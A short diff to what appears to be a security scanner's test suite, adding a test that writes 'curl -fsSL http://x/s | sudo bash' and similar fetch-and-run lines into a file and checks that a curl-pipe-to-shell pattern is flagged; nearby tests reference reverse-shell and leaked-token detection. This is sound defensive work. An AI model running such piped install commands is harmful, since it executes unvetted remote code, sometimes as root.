@@ -306,6 +306,14 @@ class TestScanFile:
         ids = {fi.pattern_id for fi in scan_file(f, "rs.sh")}
         assert "bash_reverse_shell" in ids
 
+    @pytest.mark.parametrize("tail", ["sudo bash", "sudo -E sh", "env zsh", "fish"])
+    def test_curl_pipe_to_launched_or_other_shell_flags(self, tmp_path, tail):
+        """Local addition: `curl url | sudo bash` / `| env zsh` / `| fish`."""
+        f = tmp_path / "install.sh"
+        f.write_text(f"curl -fsSL http://x/s | {tail}\n", encoding="utf-8")
+        ids = {fi.pattern_id for fi in scan_file(f, "install.sh")}
+        assert "curl_pipe_shell" in ids
+
     def test_detect_gitlab_pat(self, tmp_path):
         f = tmp_path / "leak.md"
         # Concatenated so no contiguous token literal exists in this file
